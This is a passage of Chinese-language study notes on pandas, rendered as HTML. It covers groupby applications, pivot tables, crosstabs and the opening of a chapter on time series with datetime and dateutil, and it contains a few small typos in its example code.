<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JD    10</span><br><span class="line">3H     3</span><br><span class="line">7S     7</span><br><span class="line">8S     8</span><br><span class="line">5C     5</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
<li><p>从各花色中随机抽取两张牌</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">get_suit = <span class="keyword">lambda</span> card: card[<span class="number">-1</span>] <span class="comment">#选取最后一个字母，就是花色</span></span><br><span class="line"><span class="keyword">print</span> deck.groupby(get_suit).apply(draw, n = <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#另一种方法</span></span><br><span class="line"><span class="keyword">print</span> deck.groupby(get_suit, group_keys = <span class="literal">False</span>).apply(draw, n = <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C  3C      3</span><br><span class="line">   10C    10</span><br><span class="line">D  7D      7</span><br><span class="line">   5D      5</span><br><span class="line">H  7H      7</span><br><span class="line">   2H      2</span><br><span class="line">S  8S      8</span><br><span class="line">   7S      7</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">KC     10</span><br><span class="line">JC     10</span><br><span class="line">3D      3</span><br><span class="line">7D      7</span><br><span class="line">JH     10</span><br><span class="line">10H    10</span><br><span class="line">JS     10</span><br><span class="line">3S      3</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="示例：分组加权平均值和相关系数"><a href="#示例：分组加权平均值和相关系数" class="headerlink" title="示例：分组加权平均值和相关系数"></a>示例：分组加权平均值和相关系数</h2><h3 id="根据groupy的”拆分-应用-合并”范式，DF的列与列或两个Series之间的运算"><a href="#根据groupy的”拆分-应用-合并”范式，DF的列与列或两个Series之间的运算" class="headerlink" title="根据groupy的”拆分-应用-合并”范式，DF的列与列或两个Series之间的运算"></a>根据groupy的”拆分-应用-合并”范式，DF的列与列或两个Series之间的运算</h3><ol>
<li><p>分组加权平均数</p>
<ol>
<li><p>加权平均数 是 数据乘以权数的和 / 权数的和</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'category'</span>: list(<span class="string">'aabb'</span>),</span><br><span class="line">                   <span class="string">'data'</span>: np.random.randn(<span class="number">4</span>),</span><br><span class="line">                   <span class="string">'weights'</span>: np.random.rand(<span class="number">4</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用category计算分组加权平均数</span></span><br><span class="line">grouped = df.groupby(<span class="string">'category'</span>)</span><br><span class="line">get_wavg = <span class="keyword">lambda</span> g: np.average(g[<span class="string">'data'</span>], weights = g[<span class="string">'weights'</span>])</span><br><span class="line"><span class="keyword">print</span> grouped.apply(get_wavg)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  category      data   weights</span><br><span class="line">0        a -0.995153  0.224198</span><br><span class="line">1        a  2.399610  0.921270</span><br><span class="line">2        b  1.248725  0.570782</span><br><span class="line">3        b -1.517198  0.830123</span><br><span class="line"></span><br><span class="line">category</span><br><span class="line">a    1.735167</span><br><span class="line">b   -0.390256</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>实际点的例子</p>
<ol>
<li><p>来自Yahoo!Finance的数据集，其中含有标准普尔500指数（spx字段）和几只股的收盘价</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">close_px = pd.read_csv(<span class="string">'./pydata-book-master/ch09/stock_px.csv'</span>, parse_dates = <span class="literal">True</span>, index_col = <span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> close_px[<span class="number">-4</span>:]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> close_px.pct_change()[<span class="number">-4</span>:]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">              AAPL   MSFT    XOM      SPX</span><br><span class="line">2011-10-11  400.29  27.00  76.27  1195.54</span><br><span class="line">2011-10-12  402.19  26.96  77.16  1207.25</span><br><span class="line">2011-10-13  408.43  27.18  76.37  1203.66</span><br><span class="line">2011-10-14  422.00  27.27  78.11  1224.58</span><br><span class="line"></span><br><span class="line">                AAPL      MSFT       XOM       SPX</span><br><span class="line">2011-10-11  0.029526  0.002227 -0.000131  0.000544</span><br><span class="line">2011-10-12  0.004747 -0.001481  0.011669  0.009795</span><br><span class="line">2011-10-13  0.015515  0.008160 -0.010238 -0.002974</span><br><span class="line">2011-10-14  0.033225  0.003311  0.022784  0.017380</span><br></pre></td></tr></table></figure>
<ol>
<li><p>计算由日收益率(通过百分数变化计算)与SPX之间的年度相关数组成的DF</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pct_change 对比变化，相对上个数字的相对变化</span></span><br><span class="line">rets = close_px.pct_change().dropna()</span><br><span class="line">spx_corr = <span class="keyword">lambda</span> x: x.corrwith(x[<span class="string">'SPX'</span>])</span><br><span class="line">by_year = rets.groupby(<span class="keyword">lambda</span> x: x.year)</span><br><span class="line"><span class="keyword">print</span> by_year.apply(spx_corr)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算列和列之间的相关关系</span></span><br><span class="line"><span class="comment">#计算苹果和微软的年度相关系数</span></span><br><span class="line"><span class="keyword">print</span> by_year.apply(<span class="keyword">lambda</span> g: g[<span class="string">'AAPL'</span>].corr(g[<span class="string">'MSFT'</span>]))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">          AAPL      MSFT       XOM  SPX</span><br><span class="line">2003  0.541124  0.745174  0.661265  1.0</span><br><span class="line">2004  0.374283  0.588531  0.557742  1.0</span><br><span class="line">2005  0.467540  0.562374  0.631010  1.0</span><br><span class="line">2006  0.428267  0.406126  0.518514  1.0</span><br><span class="line">2007  0.508118  0.658770  0.786264  1.0</span><br><span class="line">2008  0.681434  0.804626  0.828303  1.0</span><br><span class="line">2009  0.707103  0.654902  0.797921  1.0</span><br><span class="line">2010  0.710105  0.730118  0.839057  1.0</span><br><span class="line">2011  0.691931  0.800996  0.859975  1.0</span><br><span class="line"></span><br><span class="line">2003    0.480868</span><br><span class="line">2004    0.259024</span><br><span class="line">2005    0.300093</span><br><span class="line">2006    0.161735</span><br><span class="line">2007    0.417738</span><br><span class="line">2008    0.611901</span><br><span class="line">2009    0.432738</span><br><span class="line">2010    0.571946</span><br><span class="line">2011    0.581987</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="示例：-面向分组的线性回归"><a href="#示例：-面向分组的线性回归" class="headerlink" title="示例： 面向分组的线性回归"></a>示例： 面向分组的线性回归</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要安装statsmodels库</span></span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regress</span><span class="params">(data, yvar, xvars)</span>:</span></span><br><span class="line">    y = data[yvar]</span><br><span class="line">    x = data[xvers]</span><br><span class="line">    x[<span class="string">'intercept'</span>] = <span class="number">1</span></span><br><span class="line">    result = sm.OLS(x,y).fit()</span><br><span class="line">    <span class="keyword">return</span> result.params</span><br><span class="line"><span class="keyword">print</span> by_year.apply(regress, <span class="string">'AAPL'</span>, [<span class="string">'SPX'</span>])</span><br></pre></td></tr></table></figure>
<h2 id="透视表和交叉表"><a href="#透视表和交叉表" class="headerlink" title="透视表和交叉表"></a>透视表和交叉表</h2><h3 id="可以通过groupby以及重塑运算制作透视表"><a href="#可以通过groupby以及重塑运算制作透视表" class="headerlink" title="可以通过groupby以及重塑运算制作透视表"></a>可以通过groupby以及重塑运算制作透视表</h3><h3 id="DF有-pivot-table方法-，还有顶级方法pandas-pivot-table函数"><a href="#DF有-pivot-table方法-，还有顶级方法pandas-pivot-table函数" class="headerlink" title="DF有 pivot~table方法~，还有顶级方法pandas.pivot~table函数~"></a>DF有 pivot~table方法~，还有顶级方法pandas.pivot~table函数~</h3><h3 id="除了能为groupby提供便利之外，pivot-table还可以添加分项小计-margins"><a href="#除了能为groupby提供便利之外，pivot-table还可以添加分项小计-margins" class="headerlink" title="除了能为groupby提供便利之外，pivot~table还可以添加分项小计~(margins)"></a>除了能为groupby提供便利之外，pivot~table还可以添加分项小计~(margins)</h3><ol>
<li><p>对小费数据，根据sex和smoker计算分组平均数（默认聚合类型），并将sex和smoker放到行上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.pivot_table(index = [<span class="string">'sex'</span>, <span class="string">'smoker'</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">                   size       tip   tip_pct  total_bill</span><br><span class="line">sex    smoker</span><br><span class="line">Female No      2.592593  2.773519  0.156921   18.105185</span><br><span class="line">       Yes     2.242424  2.931515  0.182150   17.977879</span><br><span class="line">Male   No      2.711340  3.113402  0.160669   19.791237</span><br><span class="line">       Yes     2.500000  3.051167  0.152771   22.284500</span><br></pre></td></tr></table></figure>
<ol>
<li><p>只想集合tip~pct和size~，根据day进行分组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.pivot_table([<span class="string">'tip_pct'</span>, <span class="string">'size'</span>], index = [<span class="string">'sex'</span>, <span class="string">'day'</span>], columns = [<span class="string">'smoker'</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">              tip_pct                size</span><br><span class="line">smoker             No       Yes        No       Yes</span><br><span class="line">sex    day</span><br><span class="line">Female Fri   0.165296  0.209129  2.500000  2.000000</span><br><span class="line">       Sat   0.147993  0.163817  2.307692  2.200000</span><br><span class="line">       Sun   0.165710  0.237075  3.071429  2.500000</span><br><span class="line">       Thur  0.155971  0.163073  2.480000  2.428571</span><br><span class="line">Male   Fri   0.138005  0.144730  2.000000  2.125000</span><br><span class="line">       Sat   0.162132  0.139067  2.656250  2.629630</span><br><span class="line">       Sun   0.158291  0.173964  2.883721  2.600000</span><br><span class="line">       Thur  0.165706  0.164417  2.500000  2.300000</span><br></pre></td></tr></table></figure>
</li>
<li><p>传入margins = True添加分项小计</p>
<ol>
<li><p>这将会添加标签为ALL的行和列</p>
</li>
<li><p>其值对应于单个等级中所有数据的分组统计</p>
<ol>
<li><p>例子中all值为平均值：</p>
<ul>
<li>不单独考虑烟民和非烟民(ALl列)</li>
<li><p>不单独考虑行分组两个级别中的任意单项(ALL行)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.pivot_table([<span class="string">'tip_pct'</span>, <span class="string">'size'</span>], index = [<span class="string">'sex'</span>, <span class="string">'day'</span>],</span><br><span class="line">                       columns = <span class="string">'smoker'</span>, margins = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tippct size smoker No Yes All No</span><br><span class="line">Yes All sex day Female Fri 0.165296 0.209129</span><br><span class="line">0.199388 2.500000 2.000000 2.111111 Sat 0.147993</span><br><span class="line">0.163817 0.156470 2.307692 2.200000 2.250000 Sun</span><br><span class="line">0.165710 0.237075 0.181569 3.071429 2.500000</span><br><span class="line">2.944444 Thur 0.155971 0.163073 0.157525 2.480000</span><br><span class="line">2.428571 2.468750 Male Fri 0.138005 0.144730</span><br><span class="line">0.143385 2.000000 2.125000 2.100000 Sat 0.162132</span><br><span class="line">0.139067 0.151577 2.656250 2.629630 2.644068 Sun</span><br><span class="line">0.158291 0.173964 0.162344 2.883721 2.600000</span><br><span class="line">2.810345 Thur 0.165706 0.164417 0.165276 2.500000</span><br><span class="line">2.300000 2.433333 All 0.159328 0.163196 0.160803</span><br><span class="line">2.668874 2.408602 2.569672</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<pre><code>    3.  使用其他聚合函数，将其传入agfunc即可

        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> tips.pivot_table(<span class="string">'tip_pct'</span>, index = [<span class="string">'sex'</span>, <span class="string">'smoker'</span>], columns = <span class="string">'day'</span>,</span><br><span class="line">                       aggfunc = len, margins = <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果存在NA支，可以设置一个fill_value</span></span><br><span class="line"><span class="keyword">print</span> tips.pivot_table(<span class="string">'size'</span>, index = [<span class="string">'time'</span>, <span class="string">'sex'</span>, <span class="string">'smoker'</span>],</span><br><span class="line">                       columns = <span class="string">'day'</span>, aggfunc = <span class="string">'sum'</span>, fill_value = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">day             Fri   Sat   Sun  Thur    All</span><br><span class="line">sex    smoker</span><br><span class="line">Female No       2.0  13.0  14.0  25.0   54.0</span><br><span class="line">       Yes      7.0  15.0   4.0   7.0   33.0</span><br><span class="line">Male   No       2.0  32.0  43.0  20.0   97.0</span><br><span class="line">       Yes      8.0  27.0  15.0  10.0   60.0</span><br><span class="line">All            19.0  87.0  76.0  62.0  244.0</span><br><span class="line"></span><br><span class="line">day                   Fri  Sat  Sun  Thur</span><br><span class="line">time   sex    smoker</span><br><span class="line">Dinner Female No        2   30   43     2</span><br><span class="line">              Yes       8   33   10     0</span><br><span class="line">       Male   No        4   85  124     0</span><br><span class="line">              Yes      12   71   39     0</span><br><span class="line">Lunch  Female No        3    0    0    60</span><br><span class="line">              Yes       6    0    0    17</span><br><span class="line">       Male   No        0    0    0    50</span><br><span class="line">              Yes       5    0    0    23</span><br></pre></td></tr></table></figure>
</code></pre><h3 id="pivot-table的参数"><a href="#pivot-table的参数" class="headerlink" title="pivot~table的参数"></a>pivot~table的参数</h3><div class="table-container">
<table>
<thead>
<tr>
<th>参数名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>values</td>
<td>待聚合的列的名称</td>
</tr>
<tr>
<td></td>
<td>默认聚合所有数值列</td>
</tr>
<tr>
<td>index</td>
<td>用于分组的列名或其他分组键</td>
</tr>
<tr>
<td></td>
<td>出现在结果透视表的行</td>
</tr>
<tr>
<td>columns</td>
<td>用于分组的列名或者其他分组键</td>
</tr>
<tr>
<td></td>
<td>出现在结果透视表的列</td>
</tr>
<tr>
<td>aggfunc</td>
<td>聚合函数或函数列表</td>
</tr>
<tr>
<td></td>
<td>默认为’mean’</td>
</tr>
<tr>
<td></td>
<td>可以使任意对groupby有效的函数</td>
</tr>
<tr>
<td>margins</td>
<td>添加行/列小计和总计，默认为False</td>
</tr>
</tbody>
</table>
</div>
<h3 id="交叉表"><a href="#交叉表" class="headerlink" title="交叉表"></a>交叉表</h3><ol>
<li><p>用于计算分组平率的特殊透视表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(&#123;<span class="string">'Sample'</span>: range(<span class="number">10</span>),</span><br><span class="line">                     <span class="string">"Gender"</span>: [<span class="string">'Female'</span>, <span class="string">'Male'</span>, <span class="string">'Female'</span>, <span class="string">'Male'</span>, <span class="string">'Male'</span>, <span class="string">'Male'</span>, <span class="string">'Female'</span>, <span class="string">'Female'</span>, <span class="string">'Male'</span>, <span class="string">'Female'</span>],</span><br><span class="line">                     <span class="string">'Handedness'</span>: list(<span class="string">'RLRRLRRLRR'</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pd.crosstab(data.Gender, data.Handedness, margins = <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   Gender Handedness  Sample</span><br><span class="line">0  Female          R       0</span><br><span class="line">1    Male          L       1</span><br><span class="line">2  Female          R       2</span><br><span class="line">3    Male          R       3</span><br><span class="line">4    Male          L       4</span><br><span class="line">5    Male          R       5</span><br><span class="line">6  Female          R       6</span><br><span class="line">7  Female          L       7</span><br><span class="line">8    Male          R       8</span><br><span class="line">9  Female          R       9</span><br><span class="line"></span><br><span class="line">Handedness  L  R  All</span><br><span class="line">Gender</span><br><span class="line">Female      1  4    5</span><br><span class="line">Male        2  3    5</span><br><span class="line">All         3  7   10</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="示例：-2012联邦选取委员会数据库-待补充-lt-span-gt-示例-2012联邦选取委员会数据库"><a href="#示例：-2012联邦选取委员会数据库-待补充-lt-span-gt-示例-2012联邦选取委员会数据库" class="headerlink" title="示例： 2012联邦选取委员会数据库 待补充&lt;/span&gt; [示例-2012联邦选取委员会数据库]"></a>示例： 2012联邦选取委员会数据库 <span class="tag" tag-name="待补充"><span class="smallcaps">待补充</span>&lt;/span&gt; [示例-2012联邦选取委员会数据库]</span></h2><h1 id="Chapter-10-时间序列"><a href="#Chapter-10-时间序列" class="headerlink" title="Chapter 10: 时间序列"></a>Chapter 10: 时间序列</h1><h2 id="时间序列应用于以下几个主要场景"><a href="#时间序列应用于以下几个主要场景" class="headerlink" title="时间序列应用于以下几个主要场景"></a>时间序列应用于以下几个主要场景</h2><ul>
<li>时间戳(timestamp), 特定的时刻</li>
<li>固定时间(period)，如2007年1月或者2010年全年</li>
<li>时间间隔(interval)，由起始和结束时间戳表示。时期(period)可以被看做间隔的特例</li>
<li>时间或过程时间，每个时间点都是相对于特定起始时间的一个度量</li>
</ul>
<h2 id="日期和时间数据类型及工具"><a href="#日期和时间数据类型及工具" class="headerlink" title="日期和时间数据类型及工具"></a>日期和时间数据类型及工具</h2><h3 id="python拥有-data-time-数据类型"><a href="#python拥有-data-time-数据类型" class="headerlink" title="python拥有 data time 数据类型"></a>python拥有 data time 数据类型</h3><h3 id="我们主要用到datatime-time-calendar模块"><a href="#我们主要用到datatime-time-calendar模块" class="headerlink" title="我们主要用到datatime time calendar模块"></a>我们主要用到datatime time calendar模块</h3><ol>
<li><p>其中datetime.datetime是用的最多的数据类型</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="keyword">print</span> now</span><br><span class="line"><span class="keyword">print</span> now.year, now.month, now.day</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2016-09-23 16:40:23.266000</span><br><span class="line">2016 9 23</span><br></pre></td></tr></table></figure>
</li>
<li><p>datetime以毫秒形式储存日期和时间，datetime.timedelta表示两个datetime之间的时间差</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delta = datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">7</span>) - datetime(<span class="number">2008</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">8</span>, <span class="number">15</span>)</span><br><span class="line"><span class="keyword">print</span> delta <span class="comment">#书上结果是 datetime.timedelta(926,56700)</span></span><br><span class="line"><span class="keyword">print</span> delta.days</span><br><span class="line"><span class="keyword">print</span> delta.seconds</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">925 days, 15:45:00</span><br><span class="line">925</span><br><span class="line">56700</span><br></pre></td></tr></table></figure>
</li>
<li><p>给datetime对象加上(减去)一个或多个timedelta,会产生新对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">start = datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> start + timedelta(<span class="number">12</span>)</span><br><span class="line"><span class="keyword">print</span> start - <span class="number">2</span> * timedelta(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2011-01-19 00:00:00</span><br><span class="line">2010-12-14 00:00:00</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="datetime模块中的数据类型"><a href="#datetime模块中的数据类型" class="headerlink" title="datetime模块中的数据类型"></a>datetime模块中的数据类型</h3><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>date</td>
<td>以公历形式储存日历日期（年 月 日）</td>
</tr>
<tr>
<td>time</td>
<td>将时间储存为时 分 秒 毫秒</td>
</tr>
<tr>
<td>timedelta</td>
<td>表示两个datetime值之间的查(日, 秒, 毫秒)</td>
</tr>
</tbody>
</table>
</div>
<h3 id="字符串和datetime的相互转换"><a href="#字符串和datetime的相互转换" class="headerlink" title="字符串和datetime的相互转换"></a>字符串和datetime的相互转换</h3><ol>
<li><p>利用str或strftime方法(传入格式化字符串),datetime和pandas的Timestamp会被转化成字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stamp = datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> str(stamp)</span><br><span class="line"><span class="keyword">print</span> stamp.strftime(<span class="string">'%Y-%m-%d'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2011-01-03 00:00:00</span><br><span class="line">2011-01-03</span><br></pre></td></tr></table></figure>
</li>
<li><p>datetime.strptime可以用格式化字符将字符串转换成日期</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">value = <span class="string">'2011-01-03'</span></span><br><span class="line"><span class="keyword">print</span> datetime.strptime(value, <span class="string">'%Y-%m-%d'</span>)</span><br><span class="line">datestrs = [<span class="string">'7/6/2011'</span>, <span class="string">'8/6/2011'</span>]</span><br><span class="line"><span class="keyword">print</span> [datetime.strptime(x,<span class="string">'%m/%d/%Y'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> datestrs]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2011-01-03 00:00:00</span><br><span class="line">[datetime.datetime(2011, 7, 6, 0, 0), datetime.datetime(2011, 8, 6, 0, 0)]</span><br></pre></td></tr></table></figure>
</li>
<li><p>datetime.strptime是通过已知格式进行日期解析的最佳方式</p>
</li>
<li><p>但是因为输入格式定义很麻烦，所以可以用dateutil这第三方库的parser.parse方法来处理常见日期格式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dateutil.parser <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">print</span> parse(<span class="string">'2011-01-03'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dateutil可以解析几乎所有人类能够理解的日期表示形式</span></span><br><span class="line"><span class="keyword">print</span> parse(<span class="string">'Jan 31, 1997 10:45 PM'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#国际通用的格式中，日通常出现在月的前面，传入dayfirst = True即可解决这个问题</span></span><br><span class="line"><span class="keyword">print</span> parse(<span class="string">'6/12/2011'</span>, dayfirst = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>pandas通常用于处理成组日期，不管日期是DF的轴索还是列</p>
</li>
<li><p>to~datetime方法解析不同的日期表示~，对标准日期格式(如ISO8601)的解析非常快</p>
